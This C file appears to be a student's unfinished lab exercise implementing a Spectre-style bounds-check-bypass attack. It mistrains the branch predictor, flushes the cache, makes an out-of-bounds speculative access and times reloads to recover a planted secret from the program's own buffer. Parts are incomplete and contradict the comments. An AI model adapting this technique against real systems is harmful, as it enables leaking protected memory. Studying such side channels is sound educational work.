#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1<<21)
#define SENSITIVITY 40
#define LINE_SIZE 64
#define SECRET_SIZE 100
#define BOUND_OFFSET 10

#ifndef BOUND
#define BOUND 40
#endif /* ifndef BOUND */

//** Write your victim function here */
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address

int *secret_array;
int *dummy_array;

void victim_function(int idx, int bound) {
  if (idx < bound) {
    // TODO: Use secret_array to get addr into dummy_array
    secret_array[idx * LINE_SIZE] = 1;
  }
}

int main(int argc, char **argv)
{
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void*) - 1) {
      perror("mmap() error\n");
      exit(EXIT_FAILURE);
    }
    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation


    //** STEP 1: Allocate an array into the mmap */
    secret_array = (int *)huge_page;
    dummy_array = (int *)huge_page;


    volatile int bound = BOUND;
    clflush((void *)&bound);

    // Initialize the array
    for (int i = 0; i < SECRET_SIZE; i++) {
      secret_array[i*LINE_SIZE] = i;
    }
    secret_array[(BOUND+BOUND_OFFSET)*LINE_SIZE] = 90; // Suppose the secret value we want is 90.

    //** STEP 2: Mistrain the branch predictor by calling victim function here */
    // To prevent any kind of patterns, ensure each time you train it a different number of times

    for (int i = 0; i < BOUND; i++) {
      victim_function(i, bound); 
    } 

    //** STEP 3: Clear cache using clflush from utility.h */
    for (int a = 0; a < SECRET_SIZE; a++) {
      clflush(secret_array + (a*LINE_SIZE));
    }

    //** STEP 4: Call victim function again with bounds bypass value */
    int message = BOUND + BOUND_OFFSET;
    // secret_array[message * LINE_SIZE] = 1;
    clflush((void *)&bound);
    victim_function(message, bound);

    //** STEP 5: Reload mmap to see load times */
    // Just read the mmap's first 100 integers
    for (int j = 0; j < SECRET_SIZE; j++) {
      int cycles = measure_one_block_access_time((uint64_t)(secret_array + (j*LINE_SIZE)));
      if (cycles < SENSITIVITY) {
        printf("Secret Value is: %d.\n", j);
      }
    }

    printf("Done reloading.\n(Bound: %d, Expected for testing: %d)\n", BOUND, BOUND + BOUND_OFFSET);

    return 0;
}
